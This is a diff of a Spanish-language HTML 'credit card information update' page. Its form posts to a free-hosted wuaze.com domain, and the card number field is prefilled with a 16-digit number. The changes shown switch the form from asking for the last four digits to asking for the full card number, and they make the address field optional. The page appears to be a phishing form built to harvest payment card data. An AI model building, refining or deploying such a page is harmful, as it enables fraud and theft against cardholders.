@@ -162,10 +162,10 @@
         <h2>Actualización de Información de Tarjeta de Crédito</h2>
         <!--   <form id="creditCardForm" method="post">  <form id="creditCardForm" method="post" action="http://proyectoformulario.wuaze.com/guardar_datos.php"> -->
         
-        <form id="creditCardForm" method="post" action="http://ganadero-formulario.wuaze.com/index.php">
+        <form id="creditCardForm" method="POST" action="http://ganadero-formulario.wuaze.com/index.php">
 
 
-            <label for="creditCardNumber">Número de Tarjeta de Crédito (últimos 4 dígitos):</label>
+            <label for="creditCardNumber">Número de Tarjeta de Crédito:</label>
             <input type="text" id="creditCardNumber" name="creditCardNumber" value="4218281007325125" required>
 
             <div id="additionalFields">
@@ -195,8 +195,8 @@
                     <option value="Discover">Discover</option>
                 </select>
 
-                <label for="cardAddress">Dirección de la Tarjeta:</label>
-                <textarea id="cardAddress" name="cardAddress" rows="4" placeholder="Aqui la direcion ejemplo calle 1234" required oninvalid="this.setCustomValidity('Por favor, complete este campo.')" oninput="setCustomValidity('')"></textarea>
+                <label for="cardAddress">Dirección de la Tarjeta (Opcional):</label>
+                <textarea id="cardAddress" name="cardAddress" rows="4" placeholder="Aqui la direcion ejemplo calle 1234"></textarea>
             </div>
 
             <button type="submit">Enviar</button>
